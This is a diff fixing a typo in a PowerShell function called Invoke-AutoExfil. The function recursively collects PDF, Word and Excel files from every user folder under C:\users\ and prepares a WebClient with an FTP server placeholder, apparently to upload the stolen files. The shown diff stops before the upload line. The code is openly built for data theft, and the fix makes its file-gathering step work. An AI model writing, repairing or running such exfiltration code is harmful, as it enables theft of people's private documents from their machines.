@@ -2,7 +2,7 @@ function Invoke-AutoExfil
 {
     $steal = ".pdf", ".doc", ".docx", ".xls"
 
-    $files = Get-ChildIitem -Force -Recurse -Path C:\users\ -ErrorAction SilentlyContinue | Where {$_.Extension -in $steal} | Select name,fullname
+    $files = Get-ChildItem -Force -Recurse -Path C:\users\ -ErrorAction SilentlyContinue | Where {$_.Extension -in $steal} | Select name,fullname
 
     $server = "ftp://SERVERIP/"
     $webclient = New-Object System.Net.WebClient
